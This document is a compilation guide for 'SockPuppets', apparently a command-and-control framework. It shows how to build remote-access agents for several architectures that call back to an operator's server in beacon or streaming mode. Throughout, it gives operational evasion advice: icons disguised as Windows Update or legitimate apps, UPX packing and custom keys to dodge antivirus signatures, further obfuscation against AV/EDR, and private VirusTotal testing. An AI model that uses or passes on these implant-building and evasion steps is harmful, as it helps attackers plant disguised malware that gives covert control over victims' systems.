# SockPuppets Compilation Guide

## Multi-Architecture EXE Generation

SockPuppets supports compiling Python agents into standalone executables for multiple architectures.

### Supported Architectures

- **x86** - 32-bit Intel/AMD (legacy systems)
- **x64** - 64-bit Intel/AMD (most modern systems)
- **arm64** - 64-bit ARM (Apple Silicon, modern ARM devices)

### Quick Examples

#### Compile Single Architecture

```bash
# Compile for x64 (default)
sockpuppets> generate 192.168.1.100 9999 --compile

# Compile for x86 (32-bit)
sockpuppets> generate 192.168.1.100 9999 --compile --arch=x86

# Compile for ARM64
sockpuppets> generate 192.168.1.100 9999 --compile --arch=arm64
```

#### Compile Multiple Architectures

```bash
# Compile for all architectures at once
sockpuppets> generate 192.168.1.100 9999 --multi-arch

# Output:
#   - agent_xxx_x86.exe
#   - agent_xxx_x64.exe
#   - agent_xxx_arm64.exe (or _macos/_linux depending on host)
```

### Advanced Compilation Options

#### UPX Compression

UPX (Ultimate Packer for eXecutables) reduces file size significantly:

```bash
# With UPX compression (default)
sockpuppets> generate 192.168.1.100 9999 --compile

# Without UPX compression
sockpuppets> generate 192.168.1.100 9999 --compile --no-upx
```

**Note**: UPX must be installed separately. Download from: https://upx.github.io/

#### Custom Icons

Add custom icons to your executables for better blending:

```bash
# Add custom icon
sockpuppets> generate 192.168.1.100 9999 --compile --icon=/path/to/icon.ico
```

**Icon Requirements**:
- Must be `.ico` format for Windows
- Recommended size: 256x256 or multiple sizes embedded
- Use tools like GIMP or online converters to create .ico files

### Complete Examples

#### Stealth Beacon Agent (Multi-Arch)

```bash
# Create stealthy beacon agent for all architectures
sockpuppets> generate target.com 443 --beacon --interval=600 --multi-arch --key=SecretKey2026

# Output:
#   Python: agent_abc123_beacon600s.py
#   x86 EXE: agent_abc123_beacon600s_x86.exe
#   x64 EXE: agent_abc123_beacon600s_x64.exe
#   ARM64: agent_abc123_beacon600s_arm64.exe
```

#### Interactive Agent with Custom Icon

```bash
# Streaming agent with custom icon, x64 only
sockpuppets> generate 192.168.1.100 8443 --compile --arch=x64 --icon=windows_update.ico
```

#### Production-Ready Multi-Arch

```bash
# Full featured: beacon mode, custom key, all architectures, with icon
sockpuppets> generate c2.company.com 443 \
  --beacon \
  --interval=300 \
  --multi-arch \
  --key=MyCustomKey2026 \
  --icon=legitimate_app.ico
```

## Standalone Agent Generator

You can also use `agent.py` directly for scripting:

```bash
# Basic compilation
python agent.py --host 192.168.1.100 --port 9999 --compile

# Multi-architecture with beacon mode
python agent.py \
  --host target.com \
  --port 443 \
  --beacon \
  --interval 600 \
  --compile \
  --arch x86 x64 arm64 \
  --key CustomKey \
  --icon app.ico

# ARM64 only with no UPX
python agent.py \
  --host 192.168.1.100 \
  --port 8443 \
  --compile \
  --arch arm64 \
  --no-upx
```

## Platform-Specific Notes

### Windows Compilation

When compiling on Windows:
- Produces `.exe` files
- Can target x86, x64, arm64
- Icons must be `.ico` format
- UPX compression works best

**Install Requirements**:
```bash
pip install pyinstaller
# Optional: Download UPX from https://upx.github.io/
```

### macOS Compilation

When compiling on macOS:
- Produces Mach-O binaries (no .exe extension)
- Best for targeting macOS systems
- Can target x64 (Intel) and arm64 (Apple Silicon)

**Install Requirements**:
```bash
pip install pyinstaller
brew install upx  # Optional
```

### Linux Compilation

When compiling on Linux:
- Produces ELF binaries
- Can target x86, x64, arm64
- Great for Docker containers

**Install Requirements**:
```bash
pip install pyinstaller
apt-get install upx  # Optional, Debian/Ubuntu
```

## Cross-Compilation

**Important**: PyInstaller does NOT support true cross-compilation. To create binaries for different operating systems:

1. **Windows EXEs**: Must compile on Windows
2. **macOS binaries**: Must compile on macOS
3. **Linux binaries**: Must compile on Linux

**Workaround**: Use virtual machines or cloud instances:
```bash
# Example: Use Docker for Linux compilation
docker run -it python:3.11 bash
pip install pyinstaller websockets
python agent.py --host ... --compile
```

## Troubleshooting

### PyInstaller Not Found

```bash
pip install pyinstaller
# or
pip install --upgrade pyinstaller
```

### UPX Compression Failed

If UPX fails, disable it:
```bash
sockpuppets> generate host port --compile --no-upx
```

### Large File Sizes

Reduce executable size:
1. Enable UPX: `--compile` (default)
2. Remove unused imports from agent template
3. Use beacon mode instead of streaming (smaller footprint)

### Architecture Mismatch

Ensure your Python installation matches target architecture:
- 32-bit Python → Can compile x86
- 64-bit Python → Can compile x64
- ARM64 Python → Can compile arm64

### Icon Not Applied

Check that:
1. Icon file exists at specified path
2. Icon is in `.ico` format (not .png, .jpg)
3. Path doesn't contain spaces (use quotes if it does)

## File Size Comparison

Typical sizes for compiled agents:

| Configuration | Size (UPX) | Size (No UPX) |
|--------------|------------|---------------|
| x64 Streaming | ~8 MB | ~15 MB |
| x64 Beacon | ~8 MB | ~15 MB |
| x86 Streaming | ~7 MB | ~13 MB |
| ARM64 | ~9 MB | ~16 MB |

*Sizes vary based on Python version and included libraries*

## Best Practices

1. **Always test compiled agents** before deployment
2. **Use beacon mode** for longer-term operations (less network noise)
3. **Custom icons** help agents blend in with legitimate software
4. **UPX compression** reduces size and can help evade some signatures
5. **Custom encryption keys** prevent signature-based detection
6. **Multi-arch compilation** ensures compatibility across targets

## Security Considerations

- Compiled executables are NOT inherently stealthy
- AV/EDR may flag PyInstaller-compiled binaries
- Use custom icons and legitimate-looking names
- Consider additional packing/obfuscation for AV evasion
- Test against VirusTotal privately (not public submission)

## Additional Resources

- PyInstaller Documentation: https://pyinstaller.org/
- UPX Official Site: https://upx.github.io/
- Icon Converters: https://convertio.co/png-ico/
